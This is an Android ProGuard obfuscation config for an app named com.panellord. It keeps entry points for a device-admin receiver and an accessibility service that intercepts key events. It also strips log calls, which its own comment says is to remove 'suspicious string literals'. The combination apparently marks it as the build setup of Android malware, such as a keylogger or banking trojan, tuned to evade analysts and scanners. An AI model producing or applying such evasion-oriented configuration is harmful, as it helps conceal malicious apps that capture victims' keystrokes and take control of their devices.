-repackageclasses 'x'
-allowaccessmodification
-optimizationpasses 5
-mergeinterfacesaggressively

# Keep only manifest-declared entry points
-keep public class com.panellord.MainActivity {
    public <init>();
    public void onCreate(android.os.Bundle);
}
-keep public class com.panellord.DeviceAdminReceiver {
    public <init>();
}
-keep public class com.panellord.PanelAccessibility {
    public <init>();
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onInterrupt();
    public void onServiceConnected();
}

# System lifecycle callbacks
-keepclassmembers class * extends android.accessibilityservice.AccessibilityService {
    public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent);
    public void onInterrupt();
    public void onServiceConnected();
    public boolean onKeyEvent(android.view.KeyEvent);
}
-keepclassmembers class * extends android.content.BroadcastReceiver {
    public void onReceive(android.content.Context, android.content.Intent);
}
-keepclassmembers class * extends android.app.Service {
    public int onStartCommand(android.content.Intent, int, int);
    public android.os.IBinder onBind(android.content.Intent);
}

# Strip all log calls — removes suspicious string literals
-assumenosideeffects class android.util.Log {
    public static *** v(...);
    public static *** d(...);
    public static *** i(...);
    public static *** w(...);
    public static *** e(...);
}

-dontwarn **
-ignorewarnings
